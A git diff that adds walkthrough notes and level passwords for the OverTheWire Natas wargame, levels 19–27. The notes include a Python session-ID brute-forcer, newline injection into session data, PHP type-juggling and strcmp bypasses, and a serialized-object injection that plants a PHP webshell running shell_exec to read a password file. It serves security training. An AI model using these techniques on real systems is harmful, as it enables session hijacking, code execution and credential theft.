@@ -19,6 +19,15 @@ http://natasX.natas.labs.overthewire.org
 17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+21:IFekPyrQXftziDEsUr3x21sYuahypdgJ
+22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+24:OsRmXFguozKpTZZ5X14zNO43379LZveg
+25:GHF6X7YwACaYYssHVY05cFq83hRktl4c
+26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+28:JWwR438wkgTsNKBbcJoowyysdM82YjeF
 
 
 
@@ -422,5 +431,208 @@ do
     echo $i
 done
 
+19: As the page says the code for this level is virtually the same as the 
+last page we'll start by seeing what kinds of session ids we get. Using a 
+python script we can connect multiple times posting a username and password
+and then see which id we were assigned by reading the resulting cookie.
+After a little experimentation it seems that the final part of the sessid is 
+a function of the username. Moreover there seems to be some variation in
+the length of the sessid for a fixed username. Presumably as we want to hijack
+the admin session we should set the username to admin. Then using the python
+functions, 
+
+def connect_and_get_cookie():
+    r = requests.post('http://natas19.natas.labs.overthewire.org',
+                auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),data={'username':'admin','password':'1'})
+    return r.cookies['PHPSESSID']
+
+def check_lengths(x):
+    lengths=[]    
+    for i in range(x):
+        
+        s=connect_and_get_cookie()
+        
+        if len(s) not in lengths:
+            lengths.append(len(s))
+    print 'lengths: ',lengths  
+
+we can what lengths occur. Running check_lengths(100) suggests that the length
+of the sessid is either 14,16 or 18. 11 of these characters are due to the
+choice of username as admin.
+
+Using the following python function we can analyse which sets the remaining
+digits belong to, as from looking at a few sessids it seems some places
+always have the same values.
+
+def analyse_sessids(x):
+    l={14:[[],[],[]],16:[[],[],[],[],[]],18:[[],[],[],[],[],[],[]]}
+    for i in range(x):
+        s=connect_and_get_cookie()
+        
+        for j in range(len(s)-11):
+            if s[j] not in l[len(s)][j]:
+                l[len(s)][j].append(s[j])
+                
+    for key in l:    
+        print 'analysis for length: '+str(key)         
+        i=0        
+        for li in l[key]:
+            print 's['+str(i)+']: ', li         
+            i+=1
+    return l       
+
+Running analyse_sessids(500) shows that for the length 14 sessids only the
+second character seems to vary. For the length 16 the second and fourth seem
+to vary and for the length 18 the second, fourth and sixth vary. The other
+characters are fixed. So being safe and assuming the varying characters can
+take values 0 to 9, we have 10 cases to check for length 14, 100 for length 16
+and 1000 for length 18. This is achievable by brute force. I used the following
+python script,
+
+def connect_and_check_id(sessid):
+    r = requests.get('http://natas19.natas.labs.overthewire.org',
+        auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
+        cookies={'PHPSESSID':str(sessid)})
+    #print r.content    
+    if "You are logged in as a regular user" not in r.content:
+        print r.content, sessid
+        return True
 
 
+#connect_and_check_id('312d61646d696e')
+
+def get_password():
+    try:
+        for i in range(10):
+            sess_id=str(3)+str(i)+'2d61646d696e'
+            if connect_and_check_id(sess_id):
+                sys.exit()
+    
+        for i in range(10):
+            for j in range(10):
+                sess_id=str(3)+str(i)+str(3)+str(j)+'2d61646d696e'
+                if connect_and_check_id(sess_id):
+                    sys.exit()
+        
+        for i in range(10):
+            for j in range(10):
+                for k in range(10):
+                    sess_id=str(3)+str(i)+str(3)+str(j)+str(3)+str(k)+'2d61646d696e'
+                    if connect_and_check_id(sess_id):
+                        sys.exit()
+    except:
+        pass                    
+
+get_password()        
+
+This gives the password, the sessid is 3338312d61646d696e.
+
+20: From the source code we see that the sessionfile is read from, split by 
+new lines \n into lines then split by a space into two parts. If the first 
+part is not the empty string, then $_SESSION[$parts[0]]=$parts[1]. From
+the print credentials part we see that we need $_SESSION['admin']=1. From 
+the part
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+} 
+
+we see that we can fix an element of $_SESSION by passing in a name. This is
+then used by the function mywrite to write to the session file, which is
+then read by the myread function. Using the debug field we see that
+the name we put in is read as [name 'name entered']. If we can insert a \n 
+character into the name field we can get the myread function to split on the
+new line, then if after the newline we have admin 1, this will be used to
+set $_SESSION['admin']=1 and so upon refreshing we'll be logged in as an
+admin. We can pass in a newline character in the url by encoding it as %0A.
+So adding ?name='a%0Aadmin 1' to the url and refreshing twice gives the
+password.
+
+21: TODO 
+
+22: Used Wireshark TODO.
+
+23: In PHP if a string is compared with an integer, an integer value 
+is assigned to the string dependent upon the beginning part of the string.
+If it begins with numeric values, then that is taken as its integer value,
+if not then it is taken as zero. From the source code we see that we need
+_REQUEST["passwd"] to contain the string "iloveyou" but also to be > 10. So 
+we can set the passwd key value as "11iloveyou" this will satisfy both 
+requirements. 
+
+24: We need strcmp($_REQUEST["passwd"],<censored>) to return 0 which is 
+interpreted as false in PHP so that then the ! makes this true and we
+continue to the password. strcmp can be circumvented by passing it an array
+object. This causes it to return 0 and so let us through to the password,
+albeit with a warning. So via the url add on ?password[]=1. The [] causes
+the parameter to be interpreted as an array.
+
+26: We can inject an object of class Logger. The source code makes no use of
+Logger so unless it is a red herring, it suggests we need to use it somehow.
+The only way we can insert data to the server is via the GET parameters and the
+cookies PHPSESSID and drawing. We can see that drawing is used to store
+ordinarily a serialized array containing arrays describing the lines which
+will be drawn in the image. However we see that when drawFromUserdata is called
+the cookie "drawing" data is unserialized without any checks at all. We will
+serialize an object of class logger with instance variables logFile given
+as a file we have access to (namely anywhere in img/) but for our purposes
+img/natas26_gb86.php will do, the php extension is important to ensure the file
+is interpreted as php. Then we will set the instance variable exitMsg to be 
+<? echo shell_exec("cat /etc/natas_webpass/natas27") ?>'. Now we can serialize
+the object and set it as the drawing cookie. I used the following php script
+to get the serialized object, we also use base64_encode as is done in the
+source code.
+
+class Logger
+{
+   private $logFile = 'img/natas26_gb86.php';
+   private $exitMsg = '<? echo shell_exec("cat /etc/natas_webpass/natas27") ?>';
+}
+
+print base64_encode(serialize(new Logger));
+
+After we have set the result as the cookie "drawing" we can refresh the page
+then navigate to the file /img/natas26_gb86.php to obtain the password.
+This works because the drawImage function is called which in turn calls 
+the drawFromUserdata function, this unserializes our Logger object. As soon
+as there are no longer any references to the object, ie straightaway,
+the objects __destruct method is called which opens the logFile and writes
+the exit message to it. But we have set the logFile location to be a file
+accessible as in the /img directory and have also set it to have a php 
+extension. We make the exit message a php script which retrieves the password,
+which due to the logFile location is executed as such. 
+
+27: The use of the php mysql_real_escape_string() function and the single quotes
+when building the query make sql injection difficult. If that's the case
+then we need to somehow insert into the database our own entry for natas28
+with a password of our choosing. We know from the comment in the source
+code that the database is cleared every 5 minutes. Also we know that if a
+user does not exist then it is created. Using the following python script
+we will keep attempting to log in with username natas28. Hopefully once
+the database is cleared our attempt to login will cause us to create the 
+user natas28 with our own password ''.
+
+import requests
+
+keep_going=True
+ 
+while keep_going: 
+    r = requests.post('http://natas27.natas.labs.overthewire.org',
+            auth=('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'),
+             params={'username':'natas28','password':''})
+     
+
+    if 'Wrong password' not in r.content: 
+        keep_going=False
+        print r.content
+
+When this has occured the script will print out that a new user has been 
+created. Then we can log in with username 'natas28' and password ''. We
+pass the validUser and the checkCredentials check as the database now contains
+an entry with username='natas28' and password=''. When the dumpData function
+is called it uses only the username given in the query. It then fetches a
+row from the result set and returns print_r of that row. We can assume that 
+after the database is cleared the a new entry for natas28 with the correct 
+password is inserted. This is the row which is returned and so now when we
+log in with password '' dumpData provides us with the real password.       
